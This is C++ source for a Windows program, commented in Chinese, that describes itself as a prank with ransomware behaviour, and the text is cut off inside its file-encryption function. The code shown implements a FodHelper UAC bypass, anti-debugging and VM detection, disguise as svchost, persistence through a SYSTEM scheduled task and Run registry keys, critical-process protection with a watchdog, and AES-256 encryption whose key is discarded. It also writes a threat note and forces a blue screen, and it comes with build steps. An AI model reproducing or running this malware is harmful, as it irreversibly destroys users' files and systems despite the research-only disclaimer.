/**
 * @file    DadChallenge.cpp
 * @brief   一个具有恶作剧/勒索性质的Windows程序。
 * @warning 本代码仅供安全研究与学习Windows系统机制使用。
 *          禁止用于任何非法或恶意目的。作者不承担任何滥用后果。
 *
 * @details 程序运行后会尝试提权、创建持久化、隐藏自身，并实现以下流程：
 *          1. 检测是否在调试/虚拟机中，若是则自复制并退出(避免分析)。
 *          2. 检查是否已提权，否则通过FodHelper绕过UAC提权重启。
 *          3. 获取所有特权、伪装系统进程、安装计划任务与注册表启动项。
 *          4. 设置自身为“关键进程”(蓝屏保护)并启动看门狗线程。
 *          5. 显示“叫爸爸”挑战UI，用户有3次机会输入“爸爸”，否则触发勒索行为。
 *          6. 若失败则加密硬盘文件(跳过系统目录)、删除关键系统文件、写入威胁文本、蓝屏。
 *
 * @note    程序运行时会产生不可逆后果(文件加密、系统破坏)，请在严格隔离的虚拟机中测试。
 *
 * @section COMPILE 编译方法
 *
 *  1. 环境要求：
 *     - Windows SDK (10.0+)
 *     - Visual Studio 2019/2022 (或支持C++17的编译器)
 *     - 链接器需导入以下库(已在代码中通过 #pragma comment 指定)：
 *         shell32.lib, shlwapi.lib, taskschd.lib, comsuppw.lib, bcrypt.lib, crypt32.lib
 *
 *  2. 步骤：
 *     - 新建控制台应用程序项目。
 *     - 将本文件添加到项目。
 *     - 项目属性 -> 配置属性 -> C/C++ -> 代码生成 -> 运行库: 多线程(/MT) (建议静态链接)。
 *     - 字符集: 使用 Unicode 字符集。
 *     - 关闭安全警告(或使用_CRT_SECURE_NO_WARNINGS)。
 *     - 编译为 Release x86 或 x64 (建议x86以保证UAC绕过兼容性)。
 *
 *  3. 命令行参数：
 *     - /silent      静默模式(无交互，直接执行破坏)。
 *     - /nohide      不隐藏控制台窗口。
 *     - /respawn     作为守护进程启动(不检测虚拟机)。
 *
 * @section RUN 运行说明
 *
 *  1. 运行时需要管理员权限(会自动尝试UAC绕过)。
 *  2. 首次运行会在系统中留下大量痕迹(计划任务、注册表、文件副本)。
 *  3. 若通过挑战(正确输入“爸爸”三次内)，程序会写入安全标记并自毁，不会破坏系统。
 *  4. 若失败，所有固定驱动器上的用户文件将被AES加密(添加标记)，关键系统文件被删除，最后触发蓝屏。
 *  5. 注意：加密是不可逆的(密钥不保存)，系统将无法正常启动。
 */

 // 头文件包含(均为Windows原生API)
#include <windows.h>        // Windows API核心
#include <iostream>         // 标准输入输出(wcout/wcin)
#include <string>           // std::wstring
#include <fstream>          // 文件操作(写死亡笔记)
#include <sstream>          // 字符串流(未使用但保留)
#include <vector>           // std::vector 用于扩展名列表
#include <ctime>            // 时间(未使用)
#include <io.h>             // _setmode
#include <fcntl.h>          // _O_U16TEXT
#include <tlhelp32.h>       // 进程快照(未使用但保留)
#include <taskschd.h>       // 任务计划程序COM接口
#include <comdef.h>         // _bstr_t 等COM辅助
#include <shlwapi.h>        // 路径相关函数(未直接使用但链接需要)
#include <bcrypt.h>         // BCrypt加密API
#include <wincrypt.h>       // 微软加密库(未直接使用)

// 链接所需静态库
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

/********** 内部结构体定义(用于手动解析PEB) **********/
// 这些结构体未公开，但用于修改进程参数实现伪装

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG           MaximumLength;
    ULONG           Length;
    ULONG           Flags;
    ULONG           DebugFlags;
    PVOID           ConsoleHandle;
    ULONG           ConsoleFlags;
    PVOID           StandardInput;
    PVOID           StandardOutput;
    PVOID           StandardError;
    UNICODE_STRING  CurrentDirectory;
    UNICODE_STRING  DllPath;
    UNICODE_STRING  ImagePathName;
    UNICODE_STRING  CommandLine;
    PVOID           Environment;
    ULONG           StartingX;
    ULONG           StartingY;
    ULONG           CountX;
    ULONG           CountY;
    ULONG           CountCharsX;
    ULONG           CountCharsY;
    ULONG           FillAttribute;
    ULONG           WindowFlags;
    ULONG           ShowWindowFlags;
    UNICODE_STRING  WindowTitle;
    UNICODE_STRING  DesktopInfo;
    UNICODE_STRING  ShellInfo;
    UNICODE_STRING  RuntimeData;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

// Nt* 函数指针类型定义
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

/********** 全局句柄(同步/看门狗/互斥体) **********/
HANDLE g_hStopEvent = NULL;         // 看门狗停止事件
HANDLE g_hWatchdogThread = NULL;    // 看门狗线程句柄
HANDLE g_hGuardianMutex = NULL;     // 守护进程互斥体
HANDLE g_hEncMutex = NULL;          // 加密单实例互斥体

// 函数前置声明
void takeAllPrivileges();
void enableCriticalProcess(bool enable);
void triggerBSOD();
void launchWatchdog();
void stopWatchdog();
void writeDeathNote();
void countdown(int seconds);
std::wstring sanitizeInput(const std::wstring& raw);
BOOL IsElevated();
void disguiseAsSystemProcess();
void InstallScheduledTask();
BOOL BypassUAC_FodHelper();
void HideConsole(bool hide);
bool IsDebuggedOrVM();
void WriteSafeStatus(bool safe);
int ReadSafeStatus();
void SelfCopyAndDelete();
DWORD WINAPI GuardianThread(LPVOID lpParam);
void SetupRegistryRun();
void ShowChallengeUI();
void DeleteSystemFiles();

bool EncryptFileAES(const std::wstring& filePath);
DWORD WINAPI EncryptAllDrives(LPVOID);
void StartEncryption();
bool IsAlreadyEncrypted();
void SetEncryptionDone();

/********** 函数实现 **********/

/**
 * @brief 启用进程的所有特权(SeTakeOwnershipPrivilege, SeDebugPrivilege, SeShutdownPrivilege)
 *
 * 通过调用 ntdll!RtlAdjustPrivilege 启用特权。参数19=SeShutdownPrivilege，20=SeDebugPrivilege。
 */
void takeAllPrivileges() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    if (!RtlAdjustPrivilege) return;
    BOOLEAN bEnabled;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); // SeShutdownPrivilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &bEnabled); // SeDebugPrivilege
}

/**
 * @brief 将当前进程设置为“关键进程”(Critical Process)
 *
 * 关键进程被终止时会触发系统蓝屏(BSOD)，起到自我保护作用。
 * @param enable true-设置为关键进程，false-取消关键属性
 */
void enableCriticalProcess(bool enable) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
    if (RtlSetProcessIsCritical) {
        BOOLEAN bOld;
        RtlSetProcessIsCritical(enable ? TRUE : FALSE, &bOld, FALSE);
    }
}

/**
 * @brief 触发蓝屏(BSOD)
 *
 * 通过 NtRaiseHardError 传入 STATUS_FLOAT_MULTIPLE_FAULTS (0xC00002B5?)
 * 实际传入 0xC0054188，并设置响应选项为 ShutdownSystem (6)，导致系统崩溃。
 */
void triggerBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled); // 确保关机特权
    NtRaiseHardError((NTSTATUS)0xC0054188, 0, 0, NULL, 6, &uResp); // 6 = OPTION_SHUTDOWN_SYSTEM
}

/**
 * @brief 看门狗线程函数
 *
 * 等待主进程句柄或停止事件。若主进程意外退出(未先调用stopWatchdog)，则立即触发加密+蓝屏。
 * 用于防止用户强制结束任务管理器结束进程。
 */
DWORD WINAPI watchdogThread(LPVOID) {
    HANDLE hMain = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId());
    HANDLE handles[2] = { hMain, g_hStopEvent };
    DWORD ret = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
    if (ret == WAIT_OBJECT_0) {   // 主进程句柄有信号 => 主进程退出
        StartEncryption();
        Sleep(3000);
        triggerBSOD();
    }
    if (hMain) CloseHandle(hMain);
    return 0;
}

/**
 * @brief 启动看门狗线程
 */
void launchWatchdog() {
    if (g_hStopEvent) return;
    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    g_hWatchdogThread = CreateThread(NULL, 0, watchdogThread, NULL, 0, NULL);
}

/**
 * @brief 停止看门狗(正常退出时调用)
 */
void stopWatchdog() {
    if (g_hStopEvent) {
        SetEvent(g_hStopEvent);
        if (g_hWatchdogThread) {
            WaitForSingleObject(g_hWatchdogThread, 3000);
            CloseHandle(g_hWatchdogThread);
            g_hWatchdogThread = NULL;
        }
        CloseHandle(g_hStopEvent);
        g_hStopEvent = NULL;
    }
}

/**
 * @brief 安全退出(取消关键进程、停止看门狗)
 */
void safeExit() {
    enableCriticalProcess(false);
    stopWatchdog();
}

/**
 * @brief 写入死亡笔记文件("你完了.txt")并打开
 *
 * 文件内容为中文威胁文本，使用UTF-16 LE + BOM格式。
 */
void writeDeathNote() {
    const wchar_t* txtPath = L"你完了.txt";
    HANDLE hFile = CreateFileW(txtPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    WORD bom = 0xFEFF;
    DWORD written;
    WriteFile(hFile, &bom, sizeof(bom), &written, NULL);
    const wchar_t* note =
        L"你完了！！！\r\n\r\n"
        L"你有3次机会叫爸爸。\r\n"
        L"你一次都没叫。\r\n\r\n"
        L"现在电脑要蓝屏了，而且你的文件已被永久加密。\r\n"
        L"自作自受。\r\n\r\n"
        L"——陶修夷 留\r\n";
    WriteFile(hFile, note, (DWORD)(wcslen(note) * sizeof(wchar_t)), &written, NULL);
    CloseHandle(hFile);
    ShellExecuteW(NULL, L"open", txtPath, NULL, NULL, SW_SHOW);
}

/**
 * @brief 倒计时并打印剩余秒数
 * @param seconds 倒计时秒数
 */
void countdown(int seconds) {
    for (int i = seconds; i > 0; i--) {
        std::wcout << L"  " << i << L" 秒后蓝屏..." << std::endl;
        Sleep(1000);
    }
}

/**
 * @brief 清理用户输入的字符串(去除首尾空白、转小写)
 * @param raw 原始输入
 * @return 规整后的字符串
 */
std::wstring sanitizeInput(const std::wstring& raw) {
    std::wstring s = raw;
    while (!s.empty() && (s.back() == L' ' || s.back() == L'\r' || s.back() == L'\n' || s.back() == L'\t'))
        s.pop_back();
    size_t start = 0;
    while (start < s.length() && (s[start] == L' ' || s[start] == L'\t'))
        start++;
    s = s.substr(start);
    for (auto& c : s) c = towlower(c);
    return s;
}

/**
 * @brief 检查进程是否以管理员权限运行(令牌提升)
 */
BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fRet;
}

/**
 * @brief 伪装为系统进程svchost.exe
 *
 * 通过修改PEB中的ImagePathName和CommandLine，使任务管理器等显示为“C:\Windows\System32\svchost.exe”。
 */
void disguiseAsSystemProcess() {
    const wchar_t* fakePath = L"C:\\Windows\\System32\\svchost.exe";
    HMODULE ntdll = GetModuleHandleW(L"ntdll");
    if (!ntdll) return;
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)
        GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) return;

    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        0,
        &pbi, sizeof(pbi), &returnLength);
    if (status != 0) return;

    PPEB peb = (PPEB)pbi.PebBaseAddress;
    if (!peb) return;

    PRTL_USER_PROCESS_PARAMETERS params = peb->ProcessParameters;
    if (!params) return;

    size_t len = wcslen(fakePath) * sizeof(wchar_t);
    wchar_t* newBuf = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + sizeof(wchar_t));
    if (!newBuf) return;
    wcscpy_s(newBuf, len / sizeof(wchar_t) + 1, fakePath);

    params->ImagePathName.Buffer = newBuf;
    params->ImagePathName.Length = (USHORT)len;
    params->ImagePathName.MaximumLength = (USHORT)(len + sizeof(wchar_t));

    params->CommandLine.Buffer = newBuf;
    params->CommandLine.Length = (USHORT)len;
    params->CommandLine.MaximumLength = (USHORT)(len + sizeof(wchar_t));

    SetConsoleTitleW(fakePath);
}

/**
 * @brief 安装计划任务实现开机自启
 *
 * 创建名称为"WindowsUpdateService"的计划任务，触发器为系统启动时，以SYSTEM权限运行当前程序并带参数/silent /nohide。
 */
void InstallScheduledTask() {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    ITaskService* pService = NULL;
    HRESULT hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr) || !pService) {
        CoUninitialize();
        return;
    }
    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return;
    }
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        CoUninitialize();
        return;
    }
    ITaskDefinition* pDef = NULL;
    hr = pService->NewTask(0, &pDef);
    if (SUCCEEDED(hr) && pDef) {
        IPrincipal* pPrincipal = NULL;
        hr = pDef->get_Principal(&pPrincipal);
        if (SUCCEEDED(hr) && pPrincipal) {
            pPrincipal->put_UserId(_bstr_t(L"SYSTEM"));
            pPrincipal->put_LogonType(TASK_LOGON_SERVICE_ACCOUNT);
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }
        ITriggerCollection* pTriggers = NULL;
        hr = pDef->get_Triggers(&pTriggers);
        if (SUCCEEDED(hr) && pTriggers) {
            ITrigger* pTrigger = NULL;
            hr = pTriggers->Create(TASK_TRIGGER_BOOT, &pTrigger);
            if (SUCCEEDED(hr)) pTrigger->Release();
            pTriggers->Release();
        }
        IActionCollection* pActions = NULL;
        hr = pDef->get_Actions(&pActions);
        if (SUCCEEDED(hr) && pActions) {
            IAction* pAction = NULL;
            hr = pActions->Create(TASK_ACTION_EXEC, &pAction);
            if (SUCCEEDED(hr) && pAction) {
                IExecAction* pExecAction = NULL;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (SUCCEEDED(hr) && pExecAction) {
                    wchar_t exePath[MAX_PATH];
                    GetModuleFileNameW(NULL, exePath, MAX_PATH);
                    pExecAction->put_Path(_bstr_t(exePath));
                    pExecAction->put_Arguments(_bstr_t(L"/silent /nohide"));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActions->Release();
        }
        IRegisteredTask* pRegTask = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(L"WindowsUpdateService"),
            pDef,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_SERVICE_ACCOUNT,
            _variant_t(),
            &pRegTask);
        if (pRegTask) pRegTask->Release();
        pDef->Release();
    }
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
}

/**
 * @brief 通过FodHelper绕过UAC提权
 *
 * 原理：注册表 HKCU\Software\Classes\ms-settings\shell\open\command 设置恶意命令，
 * 然后启动 fodhelper.exe，它会自动以高权限启动我们的程序。
 * @return 成功返回TRUE
 */
BOOL BypassUAC_FodHelper() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmd = L"cmd /c \"" + std::wstring(exePath) + L"\" /silent /nohide";

    HKEY hKey;
    LSTATUS res = RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (res == ERROR_SUCCESS) {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)cmd.c_str(), (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", 2);
        RegCloseKey(hKey);
        ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
        Sleep(3000);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        return TRUE;
    }
    return FALSE;
}

/**
 * @brief 控制控制台窗口的显示/隐藏
 * @param hide true-隐藏，false-显示并设置UTF-16模式
 */
void HideConsole(bool hide) {
    if (hide) {
        FreeConsole();
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }
    else {
        AllocConsole();
        ShowWindow(GetConsoleWindow(), SW_SHOW);
        (void)_setmode(_fileno(stdout), _O_U16TEXT);
        (void)_setmode(_fileno(stdin), _O_U16TEXT);
    }
}

/**
 * @brief 检测是否处于调试器或虚拟机环境
 *
 * 检查:
 * - IsDebuggerPresent / CheckRemoteDebuggerPresent
 * - ACPI表包含VBOX__或VMWARE__字符串
 * - 常见虚拟机工具文件是否存在
 * @return true 表示在调试/虚拟机中
 */
bool IsDebuggedOrVM() {
    if (IsDebuggerPresent()) return true;
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return true;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\DSDT\\VMWARE__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    if (GetFileAttributesW(L"C:\\Program Files\\Oracle\\VirtualBox\\VBoxGuestAdditions.exe") != INVALID_FILE_ATTRIBUTES)
        return true;
    if (GetFileAttributesW(L"C:\\Program Files\\VMware\\VMware Tools\\VMwareTray.exe") != INVALID_FILE_ATTRIBUTES)
        return true;
    return false;
}

/**
 * @brief 写入安全状态标记(表示用户通过了挑战)
 * @param safe true-安全(挑战成功)，false-未通过或待挑战
 *
 * 存储位置1: HKCU\...\SessionInfo\AppCompatFlags (DWORD)
 * 存储位置2: 桌面desktop.ini的ADS (备用)
 */
void WriteSafeStatus(bool safe) {
    HKEY hKey;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    DWORD val = safe ? 1 : 0;
    RegSetValueExW(hKey, L"AppCompatFlags", 0, REG_DWORD, (BYTE*)&val, 4);
    RegCloseKey(hKey);
    wchar_t adsPath[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", adsPath, MAX_PATH);
    wcscat_s(adsPath, L"\\Desktop\\desktop.ini:safe_flag");
    HANDLE hFile = CreateFileW(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, &val, 1, &written, NULL);
        CloseHandle(hFile);
    }
}

/**
 * @brief 读取安全状态标记
 * @return 1-安全，0-不安全，-1-未设置
 */
int ReadSafeStatus() {
    DWORD val = 0;
    DWORD size = 4;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"AppCompatFlags", NULL, NULL, (BYTE*)&val, &size);
        RegCloseKey(hKey);
        return (int)val;
    }
    wchar_t adsPath[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", adsPath, MAX_PATH);
    wcscat_s(adsPath, L"\\Desktop\\desktop.ini:safe_flag");
    HANDLE hFile = CreateFileW(adsPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        BYTE b;
        DWORD read;
        ReadFile(hFile, &b, 1, &read, NULL);
        CloseHandle(hFile);
        return (int)b;
    }
    return -1;
}

/**
 * @brief 自复制到系统目录并删除原文件
 *
 * 将自身拷贝到 C:\Windows\System32\svchost_backup.exe 并设置隐藏系统属性，
 * 然后通过cmd删除原文件。
 */
void SelfCopyAndDelete() {
    wchar_t targetDir[MAX_PATH];
    GetSystemDirectoryW(targetDir, MAX_PATH);
    wcscat_s(targetDir, L"\\svchost_backup.exe");
    wchar_t curPath[MAX_PATH];
    GetModuleFileNameW(NULL, curPath, MAX_PATH);
    if (wcscmp(curPath, targetDir) != 0) {
        CopyFileW(curPath, targetDir, FALSE);
        SetFileAttributesW(targetDir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        std::wstring cmd = L"/c del /q \"" + std::wstring(curPath) + L"\"";
        ShellExecuteW(NULL, L"open", L"cmd.exe", cmd.c_str(), NULL, SW_HIDE);
    }
}

/**
 * @brief 守护线程：确保进程始终运行
 *
 * 利用命名互斥体检测是否已有实例运行，若无则释放互斥体退出；若有则监视主进程，
 * 待其退出后重新启动程序。
 */
DWORD WINAPI GuardianThread(LPVOID) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    g_hGuardianMutex = CreateMutexW(NULL, FALSE, L"Global\\{D4F3E2A1-B6C7-8D9E-0F1A-2B3C4D5E6F7A}");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // 已存在守护实例，则进入监视循环
        while (true) {
            HANDLE hMain = OpenProcess(SYNCHRONIZE, FALSE, GetCurrentProcessId() - 1);
            if (hMain) {
                WaitForSingleObject(hMain, INFINITE);
                CloseHandle(hMain);
                ShellExecuteW(NULL, L"open", exePath, L"/silent /nohide /respawn", NULL, SW_HIDE);
            }
            Sleep(5000);
        }
    }
    else {
        ReleaseMutex(g_hGuardianMutex);
    }
    return 0;
}

/**
 * @brief 添加注册表启动项(当前用户和本地机器)
 *
 * 键值: "WindowsDriverHost" -> 程序路径 /silent /nohide
 */
void SetupRegistryRun() {
    HKEY hKey;
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring cmdLine = L"\"" + std::wstring(exePath) + L"\" /silent /nohide";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDriverHost", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WindowsDriverHost", 0, REG_SZ, (BYTE*)cmdLine.c_str(), (DWORD)((cmdLine.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

/********** 加密相关常量与函数 **********/
#define ENC_MAGIC 0x0DADBABEEFEEABAD   // 文件末尾标记，用于识别已加密文件
#define AES_KEY_SIZE 32                // AES-256密钥长度
#define AES_IV_SIZE 16                 // 初始化向量长度
#define ENC_BLOCK_SIZE (1024 * 64)     // 未使用，仅为示意

/**
 * @brief 检查文件是否已被加密(依据末尾魔数)
 */
static bool IsFileEncrypted(const std::wstring& filePath) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return true;
    LARGE_INTEGER size;
    if (!GetFileSizeEx(hFile, &size) || size.QuadPart < 16) {
        CloseHandle(hFile);
        return false;
    }
    ULONGLONG magic = 0;
    DWORD read;
    SetFilePointer(hFile, -16, NULL, FILE_END);
    ReadFile(hFile, &magic, sizeof(magic), &read, NULL);
    CloseHandle(hFile);
    return (magic == ENC_MAGIC);
}

/**
 * @brief 在文件末尾写入加密完成标记
 */
static bool WriteEncMarker(const std::wstring& filePath) {
    HANDLE hFile = CreateFileW(filePath.c_str(), FILE_APPEND_DATA, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    ULONGLONG magic = ENC_MAGIC;
    DWORD written;
    WriteFile(hFile, &magic, sizeof(magic), &written, NULL);
    CloseHandle(hFile);
    return true;
}

/**
 * @brief 使用AES-256-CBC模式加密单个文件
 *
 * 过程：读取文件全部内容 -> 生成随机密钥/IV -> 加密 -> 覆盖原文件 -> 写入标记
 * 警告：密钥不保存，导致加密不可逆(勒索性质)
 * @return true 表示加密成功或文件已加密
 */
bool EncryptFileAES(const std::wstring& filePath) {
    if (IsFileEncrypted(filePath)) return true;

    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart == 0) {
        CloseHandle(hFile);
        return true;
    }

    std::vector<BYTE> plaintext(static_cast<size_t>(fileSize.QuadPart));
    DWORD bytesRead;
    if (!ReadFile(hFile, plaintext.data(), static_cast<DWORD>(plaintext.size()), &bytesRead, NULL) || bytesRead != plaintext.size()) {
        CloseHandle(hFile);
        return false;
    }

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) { CloseHandle(hFile); return false; }

    BYTE key[AES_KEY_SIZE];
    BYTE iv[AES_IV_SIZE];
    status = BCryptGenRandom(hAlg, key, AES_KEY_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); CloseHandle(hFile); return false; }
    status = BCryptGenRandom(hAlg, iv, AES_IV_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); CloseHandle(hFile); return false; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, AES_KEY_SIZE, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); CloseHandle(hFile); return false; }

    ULONG ciphertextSize = 0;
    status = BCryptEncrypt(hKey, plaintext.data(), static_cast<ULONG>(plaintext.size()), NULL, iv, AES_IV_SIZE, NULL, 0, &ciphertextSize, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        CloseHandle(hFile);
        return false;
    }

    std::vector<BYTE> ciphertext(ciphertextSize);
    status = BCryptEncrypt(hKey, plaintext.data(), static_cast<ULONG>(plaintext.size()), NULL, iv, AES_IV_SIZE, ciphertext.data(), ciphertextSize, &ciphertextSize, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        CloseHandle(hFile);
        return false;
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
